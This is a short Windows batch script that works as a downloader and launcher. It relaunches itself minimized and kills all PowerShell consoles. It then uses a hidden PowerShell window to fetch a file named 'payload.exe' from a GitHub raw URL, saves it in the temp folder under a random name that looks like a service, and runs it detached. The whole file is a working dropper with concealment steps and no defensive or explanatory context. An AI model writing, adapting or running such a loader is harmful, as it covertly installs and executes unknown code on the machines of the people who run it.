@echo off
setlocal EnableExtensions

rem ---- detach first: killing PowerShell must not kill this script ----
if /i not "%~1"=="go" (
  start "" /min cmd /c ""%~f0" go"
  exit /b
)

cd /d "%~dp0"

set "EXE_URL=https://raw.githubusercontent.com/V1xkzy/testing/refs/heads/main/payload.exe"
set "OUT=%TEMP%\svc_%RANDOM%%RANDOM%.exe"

rem ---- close every PowerShell console (Windows PS + pwsh) ----
taskkill /f /im powershell.exe /im pwsh.exe >nul 2>&1

rem ---- download hidden, one retry ----
for %%R in (1 2) do (
  if not exist "%OUT%" (
    powershell -nop -w h -c "try{iwr -useb '%EXE_URL%' -OutFile '%OUT%' -EA Stop}catch{}"
  )
)

if not exist "%OUT%" (
  echo Download failed: %EXE_URL%
  ping -n 4 127.0.0.1 >nul
  exit /b 1
)

rem ---- run detached so it survives this window ----
start "" "%OUT%"
ping -n 3 127.0.0.1 >nul
endlocal
exit /b 0
